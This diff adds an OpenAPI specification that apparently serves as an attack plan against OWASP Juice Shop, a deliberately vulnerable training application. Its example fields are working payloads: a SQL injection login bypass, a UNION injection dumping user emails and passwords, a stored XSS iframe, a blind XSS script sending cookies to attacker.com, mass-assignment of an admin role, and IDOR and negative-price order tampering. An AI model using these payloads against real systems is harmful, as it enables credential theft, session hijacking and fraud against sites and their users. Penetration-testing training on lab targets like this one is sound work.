@@ -1,0 +1,148 @@
+{
+    "openapi": "3.0.0",
+    "info": {
+        "title": "OWASP Juice Shop - Final Strike (Optimized)",
+        "version": "11.0.0"
+    },
+    "paths": {
+        "/rest/user/login": {
+            "post": {
+                "summary": "Main Login (Credential Harvesting)",
+                "description": "Primary target for SQLi login bypass. Harvesting 'token' and 'userId' on success.",
+                "requestBody": {
+                    "content": {
+                        "application/json": {
+                            "schema": {
+                                "type": "object",
+                                "required": ["email", "password"],
+                                "properties": {
+                                    "email": { "type": "string", "example": "' OR 1=1--" },
+                                    "password": { "type": "string", "example": "anything" }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        },
+        "/api/Users": {
+            "get": {
+                "summary": "User Directory (BOLA/BBA)",
+                "description": "Accessing this requires a valid 'loot_token'. Target for Broken Object Level Authorization."
+            },
+            "post": {
+                "summary": "User Registration (Mass Assignment)",
+                "description": "Inject 'role': 'admin' into the body to test for privilege escalation.",
+                "requestBody": {
+                    "content": {
+                        "application/json": {
+                            "schema": {
+                                "type": "object",
+                                "properties": {
+                                    "email": { "type": "string" },
+                                    "password": { "type": "string" },
+                                    "passwordRepeat": { "type": "string" },
+                                    "securityQuestionId": { "type": "integer", "default": 1 },
+                                    "securityAnswer": { "type": "string", "default": "admin" },
+                                    "role": { "type": "string", "description": "MASS ASSIGNMENT TARGET" }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        },
+        "/rest/products/search": {
+            "get": {
+                "summary": "Product Search (Confirmed SQLi)",
+                "description": "Confirmed SQLite UNION-based injection point.",
+                "parameters": [
+                    {
+                        "name": "q",
+                        "in": "query",
+                        "required": true,
+                        "schema": { "type": "string" },
+                        "example": "q=1')) UNION SELECT null,id,email,password,null,null,null,null,null FROM Users--"
+                    }
+                ]
+            }
+        },
+        "/api/Feedbacks": {
+            "post": {
+                "summary": "Submit Feedback (XSS/DoS)",
+                "description": "Requires full schema to trigger the persistent XSS store.",
+                "requestBody": {
+                    "content": {
+                        "application/json": {
+                            "schema": {
+                                "type": "object",
+                                "required": ["captchaId", "captcha", "comment", "rating"],
+                                "properties": {
+                                    "captchaId": { "type": "integer" },
+                                    "captcha": { "type": "string" },
+                                    "comment": { "type": "string", "example": "<iframe src=\"javascript:alert(`xss`)\">" },
+                                    "rating": { "type": "integer", "minimum": 1, "maximum": 5 }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        },
+        "/rest/admin/application-configuration": {
+            "get": {
+                "summary": "Administrative Blueprint Leak",
+                "description": "Unauthenticated access to internal environment metadata. CRITICAL RECONNAISSANCE."
+            }
+        },
+        "/api/Complaints": {
+            "post": {
+                "summary": "Complaint Submission (Blind XSS)",
+                "requestBody": {
+                    "content": {
+                        "application/json": {
+                            "schema": {
+                                "required": ["message"],
+                                "properties": {
+                                    "message": { "type": "string", "example": "<script>new Image().src='http://attacker.com/log?c='+document.cookie;</script>" }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        },
+        "/b2b/v2/orders": {
+            "post": {
+                "summary": "B2B Order Portal (Logic Destruction)",
+                "description": "CRITICAL: Attempting to bypass price calculations and order authorization.",
+                "requestBody": {
+                    "content": {
+                        "application/json": {
+                            "schema": {
+                                "type": "object",
+                                "required": ["cid", "orderDetails"],
+                                "properties": {
+                                    "cid": { 
+                                        "type": "string", 
+                                        "description": "Company ID - Attempt IDOR here." 
+                                    },
+                                    "orderDetails": {
+                                        "type": "object",
+                                        "properties": {
+                                            "orderId": { "type": "string" },
+                                            "totalPrice": { "type": "number", "example": -100.00 },
+                                            "quantity": { "type": "integer", "example": -5 },
+                                            "product": { "type": "string", "example": "Apple Juice (Gold Edition)" }
+                                        }
+                                    },
+                                    "role": { "type": "string", "example": "admin" }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
